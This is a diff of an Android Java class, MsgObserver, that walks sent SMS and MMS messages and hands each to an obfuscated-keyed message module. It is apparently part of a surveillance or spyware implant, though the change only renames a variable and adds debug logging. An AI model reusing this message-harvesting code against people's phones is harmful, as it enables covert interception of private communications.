@@ -62,10 +62,13 @@ public class MsgObserver extends ContentObserver implements Runnable {
 	}
 
 	void actualBrowsing() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualBrowsing)");
+		}
 		// messages: Messages.getString("b.9");
-		ModuleMessage a = (ModuleMessage) ManagerModule.self().get(Messages.getString("b.9"));
+		ModuleMessage moduleMessage = (ModuleMessage) ManagerModule.self().get(Messages.getString("b.9"));
 
-		if (a == null) {
+		if (moduleMessage == null) {
 			return;
 		}
 
@@ -88,30 +91,33 @@ public class MsgObserver extends ContentObserver implements Runnable {
 		 */
 		if (mmsEnabled) {
 			final MmsBrowser mmsBrowser = new MmsBrowser();
-			final ArrayList<Mms> listMms = mmsBrowser.getMmsList(a.getLastManagedMmsId());
+			final ArrayList<Mms> listMms = mmsBrowser.getMmsList(moduleMessage.getLastManagedMmsId());
 			final Iterator<Mms> iterMms = listMms.listIterator();
 
 			while (iterMms.hasNext()) {
 				final Mms mms = iterMms.next();
 				mms.print();
-				a.notification(mms);
+				moduleMessage.notification(mms);
 			}
 
-			a.updateMarkupMMS(mmsBrowser.getMaxId());
+			moduleMessage.updateMarkupMMS(mmsBrowser.getMaxId());
 		}
 
 		if (smsEnabled) {
 			final SmsBrowser smsBrowser = new SmsBrowser();
-			final ArrayList<Sms> listSms = smsBrowser.getLastSmsSent(a.getLastManagedSmsId());
+			final ArrayList<Sms> listSms = smsBrowser.getLastSmsSent(moduleMessage.getLastManagedSmsId());
 			final Iterator<Sms> iterSms = listSms.listIterator();
 
 			while (iterSms.hasNext()) {
 				final Sms sms = iterSms.next();
 				sms.print();
-				a.notification(sms);
+				moduleMessage.notification(sms);
 			}
 
-			a.updateMarkupSMS(smsBrowser.getMaxId());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualBrowsing), getMaxId: " + smsBrowser.getMaxId());
+			}
+			moduleMessage.updateMarkupSMS(smsBrowser.getMaxId());
 		}
 	}
 
